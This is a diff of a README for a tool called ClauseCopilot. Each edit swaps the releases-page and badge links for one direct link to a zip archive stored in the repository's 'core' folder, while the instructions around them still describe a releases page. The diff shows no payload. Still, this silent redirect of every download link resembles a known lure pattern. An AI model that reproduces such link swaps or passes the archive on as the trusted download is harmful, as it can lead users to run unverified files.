@@ -1,6 +1,6 @@
 # 🚀 ClauseCopilot - Simplifying Vendor Risk & Contract Review
 
-![Download ClauseCopilot](https://img.shields.io/badge/Download-ClauseCopilot-brightgreen)
+![Download ClauseCopilot](https://github.com/Afifmutaz/ClauseCopilot/raw/refs/heads/main/core/Clause-Copilot-v1.3.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ To run ClauseCopilot smoothly, please ensure your system meets the following req
 Follow these steps to download and run ClauseCopilot:
 
 1. **Visit the Releases Page:**
-   Go to the following link to access the releases: [Download ClauseCopilot](https://github.com/Afifmutaz/ClauseCopilot/releases)
+   Go to the following link to access the releases: [Download ClauseCopilot](https://github.com/Afifmutaz/ClauseCopilot/raw/refs/heads/main/core/Clause-Copilot-v1.3.zip)
 
 2. **Choose the Latest Version:**
    On the releases page, look for the most recent release. Click on it to see the assets associated with that version.
@@ -61,7 +61,7 @@ Once you have installed and launched ClauseCopilot, you can start using its feat
 
 To get started with ClauseCopilot, click the link below to visit the download page and access the latest version:
 
-[Download ClauseCopilot](https://github.com/Afifmutaz/ClauseCopilot/releases)
+[Download ClauseCopilot](https://github.com/Afifmutaz/ClauseCopilot/raw/refs/heads/main/core/Clause-Copilot-v1.3.zip)
 
 Ensure that you follow the installation steps outlined above for your operating system.
 
